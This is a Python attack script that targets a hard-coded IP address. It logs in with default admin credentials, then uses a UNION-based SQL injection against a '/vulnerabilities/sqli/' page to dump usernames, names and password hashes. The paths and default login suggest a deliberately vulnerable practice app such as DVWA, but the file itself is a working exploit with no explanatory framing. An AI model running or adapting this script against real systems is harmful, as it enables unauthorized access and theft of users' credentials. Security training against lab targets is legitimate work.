
import requests
import re
from urllib.parse import quote

session = requests.Session()
url = "http://31.97.117.123"

# ============================================================================
# PHASE 2: SQL INJECTION EXPLOITATION
# ============================================================================
print("\n" + "="*100)
print("PHASE 2: SQL INJECTION VULNERABILITY EXPLOITATION")
print("="*100)

# Authenticate first
login_page = session.get(f"{url}/login.php", timeout=10)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([^'\"]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else ""

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=login_data, allow_redirects=True, timeout=10)
print("\n[+] Authentication successful")

# Now exploit SQL injection
print("\n[*] Testing SQL injection in /vulnerabilities/sqli/")

# Payload to extract user credentials and password hashes
payload = "1' UNION SELECT CONCAT(user, '|', password, '|', user_id), CONCAT(first_name, '|', last_name) FROM users -- "

print(f"\n[*] SQL Injection Payload: {payload}\n")

try:
    sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit", timeout=10)
    
    # Extract all results from the response
    print("[*] Extracting data from response...\n")
    
    # Look for the pattern: First name: X <br /> Surname: Y </pre>
    matches = re.findall(r'First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response.text)
    
    print(f"[+] Found {len(matches)} user records\n")
    
    all_users = []
    
    for idx, (user_info, name_info) in enumerate(matches, 1):
        user_info = user_info.strip()
        name_info = name_info.strip()
        
        # Parse the extracted data
        if '|' in user_info and '|' in name_info:
            user_parts = user_info.split('|')
            name_parts = name_info.split('|')
            
            username = user_parts[0]
            password_hash = user_parts[1]
            user_id = user_parts[2] if len(user_parts) > 2 else "N/A"
            first_name = name_parts[0]
            last_name = name_parts[1] if len(name_parts) > 1 else "N/A"
            
            all_users.append({
                "id": idx,
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "last_name": last_name,
                "password_hash": password_hash
            })
            
            print(f"[USER #{idx}]")
            print(f"  Username: {username}")
            print(f"  First Name: {first_name}")
            print(f"  Last Name: {last_name}")
            print(f"  Password Hash: {password_hash}")
            print(f"  User ID: {user_id}")
            print()

except Exception as e:
    print(f"[-] Error: {str(e)}")


